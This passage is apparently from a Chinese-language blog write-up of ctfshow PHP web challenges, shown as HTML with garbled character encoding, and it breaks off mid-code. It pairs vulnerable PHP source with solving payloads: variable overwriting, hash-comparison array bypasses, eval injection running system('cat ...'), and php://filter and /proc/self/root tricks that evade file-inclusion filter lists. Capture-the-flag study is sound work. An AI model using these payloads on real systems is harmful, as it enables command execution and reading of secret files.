class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–çš„é¢˜ï¼Œå°†sucesè¦†ç›–ä¸ºflagï¼Œç„¶åå°†errorè¦†ç›–ä¸ºsuces</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">suces=flag</span><br><span class="line">[post data]</span><br><span class="line">error=suces</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è€ç”Ÿå¸¸è°ˆäº†ï¼Œä¼ å…¥æ•°ç»„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2[]=1</span><br><span class="line">[post data]</span><br><span class="line">v1[]=2</span><br></pre></td></tr></table></figure><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»æ‡‚é¢˜æ„å³å¯</p><img src="https://img-blog.csdnimg.cn/d1dac7e5609b48e685a827f840b55da4.png" alt="img" style="zoom:80%;" /><p>æ‰€ä»¥åªè¦v1ä¸­ä¸ä¼ å…¥flag=1ä¹‹ç±»çš„è¯­å¥ï¼Œéƒ½æ˜¯ä¼šçˆ†flagçš„</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3[]=1</span><br><span class="line">[post data]</span><br><span class="line">v2=SkyMirror</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§ç±»0=0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3=240610708 </span><br><span class="line">[post data]</span><br><span class="line">v2=flag=0</span><br></pre></td></tr></table></figure><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç”¨-00æˆªæ–­å­—ç¬¦ä¸²å³å¯"><a href="#ç”¨-00æˆªæ–­å­—ç¬¦ä¸²å³å¯" class="headerlink" title="ç”¨%00æˆªæ–­å­—ç¬¦ä¸²å³å¯"></a>ç”¨%00æˆªæ–­å­—ç¬¦ä¸²å³å¯</h3><p>strrev()æ˜¯åè½¬</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=a%00778</span><br></pre></td></tr></table></figure><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¿…é¡»è¦æœ‰å­—æ¯ï¼Œç™½åå•ã€‚</p><p>ä¾ç„¶æ˜¯newä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æœ€å¥½èƒ½æ‰§è¡Œæ–¹æ³•</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br><span class="line">v1=Reflectionclass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¸€é¢˜çš„æ–¹æ³•ä¸è¡Œäº†ï¼Œé¦–å…ˆæ‰«æç›®å½•ï¼Œæƒ³åˆ°ç”¨scandirï¼Œç»“æœä¸æ‰§è¡Œï¼Œå¯èƒ½æ˜¯Reflectionclassæ— è¿™ç§æ–¹æ³•ï¼Œæ²¡æœ‰æ·±ç©¶</p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>å­¦åˆ°æ–°æ–¹æ³•ä¸€ä¸ªï¼Œphpå†…ç½®ç±»ï¼ŒFilesystemIterator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo getcwd().PHP_EOL;</span><br><span class="line">echo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class="line">echo new FilesystemIterator(getcwd());</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>phpä¸­&amp;ç±»ä¼¼äºc++çš„å¼•ç”¨ï¼Œä¸cçš„å–åœ°å€ç¬¦æœ‰åŒºåˆ«ã€‚</p><p>å˜é‡è¦†ç›–çš„é¢˜ç›®ï¼Œä¸»è¦çš„é—®é¢˜æ˜¯å†…éƒ¨çš„å˜é‡æ— æ³•å¼•ç”¨å¤–éƒ¨çš„å‚æ•°</p><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><blockquote><p>$GLOBALSå®šä¹‰ï¼šå¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ï¼ˆä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ï¼‰ï¼Œä¸æ‰€æœ‰å…¶ä»–è¶…å…¨å±€å˜é‡ä¸åŒï¼Œ$GLOBALSåœ¨PHPä»£ç ä¸­ä»»ä½•åœ°æ–¹æ€»æ˜¯å¯ç”¨çš„ï¼Œè‡ªå·±å¯ä»¥é€šè¿‡æ‰“å° $GLOBALSè¿™ä¸ªå˜é‡çš„ç»“æœå°±çŸ¥é“äº†ã€‚</p></blockquote><p>æ —å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$var1=&#x27;www.phpernote.com&#x27;;</span><br><span class="line">$var2=&#x27;www.google.cn&#x27;;</span><br><span class="line">test();</span><br><span class="line">function test()&#123;</span><br><span class="line">    $var1=&#x27;taobao&#x27;;</span><br><span class="line">    echo $var1,&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">global $var1;</span><br><span class="line">echo $var1,&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">    echo $GLOBALS[&#x27;var2&#x27;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="web112-æ–‡ä»¶åŒ…å«"><a href="#web112-æ–‡ä»¶åŒ…å«" class="headerlink" title="web112(æ–‡ä»¶åŒ…å«)"></a>web112(æ–‡ä»¶åŒ…å«)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶åŒ…å«è¿‡æ»¤çš„ä¸å…¨ï¼Œç”¨php://åè®®å³å¯</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†filterï¼Œä½†å¼€æ”¾äº†inputï¼Œè¿™æ ·å°±æœ‰ä¸¤ç§æ–¹æ³•ã€‚ç»“æœåœ¨å°è¯•è¿‡ç¨‹ä¸­inputå¤±è´¥äº†ï¼Œå¿½ç„¶å‘ç°ä¹‹å‰çŸ¥è¯†çš„è¯¯åŒºï¼Œhighlight_fileå¹¶æ²¡æœ‰åŒ…å«ï¼Œå±äºæ˜¯å‚»äº†ï¼Œçœ‹hintçœ‹äº†å¦ä¸€ç§è§£æ³•ä¸æ‡‚è¿™å«ç”šä¹ˆï¼Œè™šå‡æ–‡ä»¶ï¼Ÿ</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file=compress.zlib://flag.php</span><br><span class="line">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹å¾ˆå¥½ç©çš„ä¸€ç§å¥‡æ€ªçš„æƒ…å†µã€‚</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%0c36</span><br></pre></td></tr></table></figure><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         